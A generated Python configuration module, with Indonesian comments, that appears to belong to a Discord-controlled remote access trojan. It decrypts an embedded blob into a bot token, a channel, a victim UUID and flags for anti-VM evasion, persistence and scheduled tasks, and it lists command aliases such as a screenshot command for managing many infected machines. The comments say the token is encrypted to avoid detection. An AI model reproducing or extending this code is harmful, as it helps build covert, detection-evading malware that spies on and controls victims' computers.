"""Generated 2026-10-30T00:11:33 â€” jangan diedit tangan.

Token, channel, dan base URL disimpan sebagai blob terenkripsi. Yang
muncul di binary cuma base64 acak, bukan pola token Discord.
"""

from ._crypt import open_blob

_K = b'%L\xd9\xacL^\x9f\x021\xf4"f-8C\xc4M:\xb0/\xe3\'\x1c\xd0\xb9Y\x81\x9a\x1f\xb7H\xe4'

_B = "OGsUKBStEbiZ6D183WvYNqIgaL/WTLJZ0379o/r054H2BR0VLXlQPSVusDRaYYjJo4jZC5tfBQglma+83FaBptX1a+05mafAhcCVYiRENcm3AjDoeHSUQrMsa+H/TorGo6aLWxkhChNsKcrqmsjt9adMDvUnW0dJMwIrHvQ7GqgmtADPTbgTW1WF89WIpNK68/rJNahByPG3vLqqqTvTgFxZtdOSAghkgBWD2IAf6Dxbnuo="

_f = open_blob(_B, _K)
TOKEN = _f[0]
CHANNEL = int(_f[1])
UUID = _f[2]
NAME = _f[3]
POLL = float(_f[4])
ANTI_VM = _f[5] == "1"
PERSIST = _f[6] == "1"
TASK = _f[7] == "1"
API = _f[8]
# Alias pendek: !a info, !b shot. Dipakai kalau mesinnya sudah banyak dan
# uuid8 nggak muat di kepala.
ALIAS = _f[9]
